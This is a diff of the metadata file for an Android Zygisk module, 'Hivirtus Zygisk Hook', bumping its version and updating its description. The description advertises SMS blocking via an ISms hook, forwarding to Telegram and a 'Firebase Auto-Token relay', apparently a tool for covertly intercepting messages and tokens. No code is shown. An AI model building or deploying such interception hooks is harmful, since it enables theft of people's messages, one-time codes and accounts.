@@ -1,7 +1,7 @@
 id=hivirtus_zygisk_mode
 name=Hivirtus Zygisk Hook
-version=v2.65.0
-versionCode=118
+version=v2.66.0
+versionCode=119
 author=@hivirtus
-description=Zygisk — SMS block (root appops + ISms hook) + Telegram forward @Hivirtus @Liqdy
+description=Zygisk — SMS block + Telegram + Firebase Auto-Token relay @Hivirtus @Liqdy
 zygisk=1
